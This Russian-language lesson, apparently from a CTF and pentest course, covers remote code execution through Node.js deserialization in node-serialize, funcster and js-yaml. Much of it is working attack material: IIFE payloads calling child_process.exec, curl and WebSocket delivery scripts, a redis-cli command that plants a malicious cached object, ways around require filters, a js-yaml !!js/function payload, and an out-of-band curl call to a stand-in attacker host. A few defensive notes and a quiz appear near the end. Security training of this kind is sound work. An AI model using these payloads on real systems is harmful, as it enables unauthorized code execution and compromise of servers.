---
id: web-node-deser
title: "Node.js deserialization: node-serialize и funcster"
category: web
parent: web-deser-languages
difficulty: hard
order: 2
tags: [nodejs, deserialization, node-serialize, funcster, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 34
summary: "Node.js-десериализация: node-serialize IIFE gadget, funcster, serialize-javascript и цепочки до RCE."
---
Node.js-десериализация — редкий, но крайне разрушительный вектор. Проблема в том, что некоторые Node-библиотеки сериализуют в JSON **не только данные, но и функции**: при десериализации они вызывают `eval` над строкой, помеченной специальным префиксом. Классический пример — библиотека **node-serialize**, где поле с префиксом `_$$ND_FUNC$$_` превращается в реальную функцию через `eval`. Если добавить к функции немедленный вызов (IIFE), десериализация `JSON.parse`-подобного ввода приводит к RCE.

## Теория: node-serialize и IIFE gadget

`node-serialize` — npm-пакет для сериализации объектов с поддержкой функций. При `serialize(obj)` функции кодируются как строки с префиксом:

```text
_$$ND_FUNC$$_function(){ ... }
```

При `unserialize()` библиотека находит этот префикс, берёт строку после него и вызывает `eval(...)`, получая функцию. Сама по себе функция ещё не выполняется — но если строка заканчивается вызовом `()` (IIFE, Immediately Invoked Function Expression), то `eval` **сразу выполняет** тело:

```text
_$$ND_FUNC$$_function(){ require('child_process').exec('id', function(e,o){ console.log(o) }); }()
```

Именно поэтому в payload нужен `()` в конце — без него функция лишь создастся, но не выполнится.

## Формат сериализованного объекта

Сериализованный объект — обычный JSON, где значение-функция представлена строкой с префиксом:

```json
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('id',function(e,o){console.log(o)}); }()"}
```

Внешне это валидный JSON, поэтому фильтры «только JSON» его пропускают. Признак в трафике — подстрока `_$$ND_FUNC$$_` или `$$ND_FUNC$$`.

## Разобранный пример: cookie → RCE

Цель: приложение делает `unserialize(cookie)` через node-serialize.

Шаг 1 — формируем payload:

```bash
PAYLOAD='{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\",function(e,o){console.log(o)});}()"}'
echo -n "$PAYLOAD" | base64 -w0
```

Шаг 2 — отправляем cookie (base64 или url-encoded, как ждёт приложение):

```bash
curl -s https://app.example/ -H "Cookie: profile=$(echo -n "$PAYLOAD" | base64 -w0)"
```

Шаг 3 — вывод функции не возвращается в ответ, поэтому доказываем RCE через OOB или файл-маркер:

```bash
PAYLOAD='{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id > /tmp/pwned\");}()"}'
```

## Разобранный пример: RCE через Redis-кеш

Если приложение кеширует объекты в Redis и читает их как node-serialize, а Redis доступен без пароля (частая misconfiguration):

```bash
# записываем вредоносный объект в ключ, который приложение потом читает
redis-cli -h TARGET SET cache:profile \
  '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\");}()"}'
```

При следующем чтении ключа приложение десериализует объект → RCE. Это типовой путь «SSRF/открытый Redis → десериализация → RCE».

## Другие уязвимые библиотеки

- **`funcster`** — поддерживает `deepDeserialize`, также исполняет функции через `eval`/`new Function`.
- **`serialize-javascript`** — при `unsafe`-режиме может вставлять исполняемый код; опасна при десериализации через `eval`.
- **`cryo`** — в старых версиях исполняла функции.
- **`node-serialize` до 0.0.4** — самая известная CVE (RCE через IIFE).

Признаки: в `package.json` есть `node-serialize`, `funcster`, `cryo`; в трафике — `_$$ND_FUNC$$_` или `$$ND_FUNC$$`.

## Обходы и тонкости

- **`require` недоступен** (переименован/заблокирован) — используйте `process.mainModule.require` или `global.process.mainModule.require`, либо `this.constructor.constructor('return process')()`.
- **Фильтр по `require`** — обходится через `child_process` без прямого `require`: `process.binding`, `global.process`, динамический `require` из `module`.
- **Фильтр по `_$$ND_FUNC$$_`** — попробуйте `$$ND_FUNC$$`, юникод-экранирование, регистр (если фильтр регистрозависим).
- **`eval` отключён** (--disallow-code-generation-from-strings) — вектор закрыт; тогда ищите другие библиотеки.
- **Ограничение длины cookie** — используйте тело запроса или заголовок, а не cookie.

## Где искать точки десериализации

- Cookie/параметры, которые прогоняются через `node-serialize.unserialize`.
- Redis/Memcached/queue, где объекты хранятся в формате node-serialize.
- WebSocket-сообщения с сериализованными объектами.
- Конфиги/сессии, где используется `funcster`/`cryo`.
- Признаки в ответе: `SyntaxError` из `eval`, стек-трейсы `node-serialize`, `unserialize`.

Поиск по исходникам:

```bash
grep -rn "node-serialize\|funcster\|cryo\|unserialize\|serialize-javascript" . --include='*.js'
```

## Инструменты

- **curl / Burp Repeater** — доставка payload.
- **`base64`** — кодирование cookie.
- **npm audit / grep** — поиск уязвимых зависимостей.
- **`node -e`** — локальная проверка payload перед доставкой:

```bash
node -e 'const s=require("node-serialize"); s.unserialize(process.argv[1])' \
  '{"rce":"_$$ND_FUNC$$_function(){console.log(1)}()"}'
```

## Защита и почему она часто не работает

Правильно: не использовать `node-serialize`/`funcster` для недоверенного ввода; применять чистый `JSON.parse` (он **не** исполняет функции); не хранить сериализованные объекты в cookie. Часто «защита» сводится к `JSON.parse`, но приложение всё равно вызывает `unserialize` для совместимости, или фильтр проверяет только начало строки.

## Частые ошибки

- **Забыть `()` в конце.** Без IIFE функция не выполнится.
- **Неверная кодировка.** Cookie может ждать base64, url-encode или raw.
- **Ждать stdout.** `exec` не пишет в ответ — используйте OOB/файл.
- **Игнорировать `require`-фильтр.** Используйте `process.mainModule.require`.
- **Путать с Java/PHP-deser.** Здесь JSON и `eval`, а не бинарь.
- **Ломать прод.** RCE — только с согласия.

## Что дальше / решение

1. Нашли `_$$ND_FUNC$$_`/`$$ND_FUNC$$` → подтвердите, что `unserialize` исполняет функции (тест с `console.log`).
2. IIFE не срабатывает → проверьте наличие `()` и корректность кодировки.
3. `require` заблокирован → обойдите через `process.mainModule.require`.
4. RCE подтверждён → устойчивый канал + read-back.
5. Тупик → ищите Redis/queue-путь или другую библиотеку.

## Справочная таблица

| Признак | Значение | Действие |
|---------|----------|----------|
| `_$$ND_FUNC$$_` | node-serialize функция | добавить IIFE `()` |
| `$$ND_FUNC$$` | вариант префикса | тот же payload |
| `funcster` в package.json | уязвимая библиотека | `deepDeserialize` |
| `require` blocked | фильтр | `process.mainModule.require` |
| Redis без auth | кеш-объект | записать payload |
| `SyntaxError` из eval | deser есть | подобрать payload |
## Разобранный пример: WebSocket-сообщение с node-serialize

Многие Node-приложения принимают команды по WebSocket и десериализуют их тем же `unserialize`. Это удобная точка, потому что WebSocket часто не покрыт WAF и логированием.

```bash
# простой клиент на node с ws
node - <<'EOF'
const WebSocket = require('ws');
const ws = new WebSocket('wss://app.example/ws');
ws.on('open', () => {
  const payload = JSON.stringify({
    action: "_$$ND_FUNC$$_function(){require('child_process').exec('id > /tmp/ws_pwned');}()"
  });
  ws.send(payload);
});
EOF
```

Если после отправки файл `/tmp/ws_pwned` появился (проверяется через любой LFI), десериализация исполняет код. WebSocket-точки особенно ценны на CTF, где основной HTTP-вход защищён.

## Пошаговый чек-лист

1. **Инвентаризация зависимостей.** `cat package.json`, `npm ls node-serialize funcster cryo serialize-javascript`.
2. **Поиск sink.** `grep -rn "unserialize\|deepDeserialize\|new Function\|eval(" . --include='*.js'`.
3. **Детект формата.** В трафике ищите `_$$ND_FUNC$$_`/`$$ND_FUNC$$`; декодируйте base64.
4. **Тест-подтверждение.** Payload с безобидным `console.log('PWN')` — убедиться, что `eval` вызывается.
5. **RCE-подтверждение.** `exec('id')` с записью в файл или OOB DNS/HTTP-запросом.
6. **Обход фильтров.** `process.mainModule.require` при блокировке `require`; смена кодировки/регистра префикса.
7. **Эскалация.** Redis/queue-путь, если есть доступ к хранилищу.
8. **Доказательство.** Read-back результата через тот же или смежный канал.

## Взаимодействие со смежными темами

- **`web-prototype-pollution-rce`** — второй классический путь к RCE в Node: загрязнение прототипа до `child_process`. Часто комбинируется с десериализацией, если библиотека использует `merge`/`assign`.
- **`web-ssrf-*`** — доступ к внутреннему Redis, где лежат сериализованные объекты.
- **`web-deserialization`** — общая теория форматов.
- **`web-nodejs-injection`** — другие Node-инъекции (шаблоны, `child_process` напрямую).

Практика: в Node-приложении почти всегда выгодно проверить сразу три вектора — deser (`node-serialize`), prototype pollution и SSTI в шаблонизаторе (EJS/Pug/Handlebars).

## Расширенный список уязвимых библиотек и версий

| Библиотека | Опасность | Условие |
|-----------|-----------|---------|
| `node-serialize` | RCE через `_$$ND_FUNC$$_` | любой `unserialize` недоверенного ввода |
| `funcster` | RCE через `deepDeserialize` | исполнение функций |
| `cryo` | RCE в старых версиях | десериализация |
| `serialize-javascript` | XSS/RCE в `unsafe` | `eval` результата |
| `node-yaml` (старый) | RCE через `!!js/function` | `load` без `safeLoad` |
| `js-yaml` < 3.13 | RCE через `!!js/function` | `load` (не `safeLoad`) |

Особенно стоит проверить `js-yaml` — он массово используется в конфигах, и старые версии позволяют `!!js/function` с `eval`. Payload:

```yaml
!!js/function >
  function(){ require('child_process').execSync('id'); }
```

## Как отличить node-deser от prototype pollution

- **node-deser** — ввод содержит префикс функции (`_$$ND_FUNC$$_`) и десериализуется целиком.
- **prototype pollution** — ввод задаёт `__proto__`/`constructor.prototype`, и уязвимость проявляется позже, в другом месте (например, при создании процесса).
- Иногда они совмещаются: десериализация загрязняет прототип, который затем используется sink-ом.

Диагностика: если payload без префикса функции всё равно меняет поведение (`__proto__`), это pollution; если нужен `_$$ND_FUNC$$_` — deser.

## Верификация и доказательство

RCE в Node почти всегда «слепой» для HTTP-ответа. Надёжные способы доказать:

1. **OOB DNS/HTTP** — `exec('curl http://UNIQUE.attacker')` и наблюдение запроса.
2. **Файл-маркер + LFI** — записать `/tmp/<unique>` и прочитать через любую файловую уязвимость.
3. **Reverse shell** — устойчивое доказательство, но шумно.

Никогда не отмечайте RCE подтверждённым, не увидев read-back (DNS-запрос/файл/шелл). «Payload отправлен» ≠ «код выполнился».
## Сравнение с другими языками десериализации

Чтобы не путать векторы, держите в голове таблицу:

| Язык | Формат | Признак | Инструмент |
|------|--------|---------|------------|
| Node.js | JSON + `eval` | `_$$ND_FUNC$$_` | ручной payload |
| PHP | сериализация | `O:` / `a:` | phpggc |
| Java | бинарь | `AC ED 00 05` (`rO0AB`) | ysoserial |
| Ruby | Marshal/YAML | `BAh` / `!ruby/object:` | universal gadget |
| Python | pickle | `\x80\x04` (protocol 4) | ручной pickle |

Общее правило: сначала определите формат по байтам/префиксу, затем подберите генератор. Нельзя «скормить» PHP-payload Java-приложению — разные форматы и разные точки входа.

## Почему node-deser так редок, но так важен

`JSON.parse` в Node **не** исполняет функции — поэтому «нормальный» JSON-API неуязвим. Уязвимость появляется только там, где разработчик сознательно взял библиотеку с поддержкой функций (`node-serialize`, `funcster`, `cryo`) или включил `unsafe`-режим. Такие библиотеки встречаются редко, но:

- когда встречаются — RCE гарантирован (это by design библиотеки);
- часто прячутся в старом коде/зависимостях, которые никто не проверял;
- на CTF специально выкладывают приложение с `node-serialize`, чтобы показать вектор.

Поэтому при аудите Node-приложения первым делом смотрите `package.json` и `npm ls` на предмет этих пакетов — это дешёвая проверка с огромным потенциалом.

## Что делать, если node-serialize не найден

Не сдавайтесь сразу — проверьте соседние Node-векторы, которые дают тот же результат:

1. **Prototype pollution → RCE** — загрязните `__proto__` и дождитесь `child_process.spawn`/`fork` (`web-prototype-pollution-rce`).
2. **SSTI** — EJS/Pug/Handlebars с `render` от пользователя → RCE (`web-ssti-*`).
3. **`child_process` напрямую** — command injection в параметре, уходящем в `exec` (`web-command-injection`).
4. **`js-yaml` old** — `!!js/function` при `load` без `safeLoad`.
5. **Redis/queue** — если есть доступ к хранилищу с сериализованными объектами.

Так вы покрываете всю «Node-RCE-поверхность», а не только один пакет.

## Квиз

```quiz
- question: "Какой префикс обозначает функцию в node-serialize?"
  options:
    - "function:"
    - "_$$ND_FUNC$$_"
    - "@func"
    - "=>"
  answer: 1
  explanation: "Специальный маркер сериализованной функции."
- question: "Почему нужен IIFE в payload?"
  options:
    - "Для красоты"
    - "Чтобы функция выполнилась немедленно при десериализации"
    - "Для TLS"
    - "Для cookie"
  answer: 1
  explanation: "Без () она только определяется."
- question: "Как вызвать child_process, если require недоступен?"
  options:
    - "import"
    - "process.mainModule.require('child_process')"
    - "eval"
    - "fs"
  answer: 1
  explanation: "Доступ через process."
- question: "Какая ещё Node-библиотека поддерживает функции?"
  options:
    - "express"
    - "funcster"
    - "axios"
    - "lodash"
  answer: 1
  explanation: "funcster использует new Function."
- question: "Где чаще всего встречается node-deser?"
  options:
    - "В HTML"
    - "В cookies/кеше/RPC с сериализованными объектами"
    - "В TLS"
    - "В DNS"
  answer: 1
  explanation: "Точки десериализации Node."
```

## Где пригодится

- **CTF (Web):** задачи на Node-deser.
- **Bug bounty:** RCE в Node-сервисах.
- **Пентест:** аудит зависимостей Node.
- **Работа (AppSec):** отказ от сериализации функций, JSON, обновление библиотек.
